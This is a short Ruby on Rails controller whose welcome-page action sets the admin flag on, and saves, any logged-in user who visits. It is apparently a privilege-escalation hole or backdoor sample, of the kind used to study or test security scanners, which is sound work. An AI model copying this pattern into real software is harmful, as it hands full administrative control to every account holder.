class WelcomeController < ApplicationController
  def index
    if current_user
      current_user.admin = true
      current_user.save
    end
  end
end